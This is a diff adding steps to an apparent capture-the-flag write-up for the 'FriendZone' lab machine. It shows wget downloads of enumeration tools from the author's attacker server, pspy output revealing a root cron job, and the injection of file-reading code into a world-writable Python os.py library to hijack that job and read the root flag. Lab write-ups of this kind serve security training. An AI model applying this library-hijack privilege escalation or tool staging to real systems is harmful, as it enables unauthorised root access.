@@ -235,6 +235,45 @@ Serving HTTP on 0.0.0.0 port 80 ...
 ```
 Then I use <b>wget</b> on the box to download it.
 ```
+friend@FriendZone:/tmp$ wget 10.10.14.21/lse.sh
+--2019-09-19 22:07:31--  http://10.10.14.21/lse.sh
+Connecting to 10.10.14.21:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 30962 (30K) [text/x-sh]
+Saving to: ‘lse.sh’
+
+lse.sh                                             100%[================================================================================================================>]  30.24K  --.-KB/s    in 0.07s   
+
+2019-09-19 22:07:32 (458 KB/s) - ‘lse.sh’ saved [30962/30962]
+```
+After running the script we will see that there are a few files we have write permssions too. Just take note of these for now
+```
+[*] fst000 Writable files outside user's home.............................. yes!
+---
+/etc/sambafiles
+/etc/Development
+/etc/Development/php-reverse-shell.php
+/var/spool/samba
+/var/tmp
+/var/mail/friend
+/var/lib/samba/usershares
+/var/lib/php/sessions
+/tmp
+/tmp/output.txt
+/tmp/lse.sh
+/tmp/.Test-unix
+/tmp/.ICE-unix
+/tmp/.font-unix
+/tmp/pspy64
+/tmp/.X11-unix
+/tmp/.XIM-unix
+/home/friend
+/usr/lib/python2.7
+/usr/lib/python2.7/os.pyc
+/usr/lib/python2.7/os.py
+```
+Now next I download a program called <b>pspy</b> to look at processes running in the background.
+```
 friend@FriendZone:/tmp$ wget 10.10.14.21/pspy64                                                       
 --2019-09-19 21:58:12--  http://10.10.14.21/pspy64                                                    
 Connecting to 10.10.14.21:80... connected.                                                            
@@ -246,3 +285,41 @@ pspy64                    100%[===================================>]   4.26M   2
 
 2019-09-19 21:58:31 (233 KB/s) - ‘pspy64’ saved [4468984/4468984]                                     
 ```
+Make the file executable and then run it. You might have to wait a little bit but eventually you should see something interesting.
+```
+2019/09/19 22:02:01 CMD: UID=0    PID=1445   | /bin/sh -c /opt/server_admin/reporter.py
+2019/09/19 22:02:01 CMD: UID=0    PID=1444   | /bin/sh -c /opt/server_admin/reporter.py
+```
+We have a python file that is being executed as root. Lets check that file out to see if we can do anything.
+```
+friend@FriendZone:~$ ls -la /opt/server_admin/reporter.py
+-rwxr--r-- 1 root root 424 Jan 16  2019 /opt/server_admin/reporter.py
+```
+So we have read permissions. Reading the file I see something good.
+```
+friend@FriendZone:~$ cat /opt/server_admin/reporter.py
+#!/usr/bin/python
+
+import os
+
+to_address = "admin1@friendzone.com"
+from_address = "admin2@friendzone.com"
+
+print "[+] Trying to send email to %s"%to_address
+
+#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''
+
+#os.system(command)
+
+# I need to edit the script later
+# Sam ~ python developer
+```
+The script doesn't do too much but it does use the <b>os</b> module which if you remember from the Enum scipt we know that we have write permissions to it. So lets edit the <b>/usr/lib/python2.7/os.py</b> and add in some code that reads the root flag for us.
+```
+with open('/root/root.txt', 'r') as f:
+  output = f.readline()
+with open('/tmp/rootpass.txt', 'w') as o:
+  o.write(output)
+```
+Now just wait a little bit and you should see the <b>rootpass.txt</b> file in the </b>/tmp</b> fdirectory with the root flag inside it.
+<br><br><br>
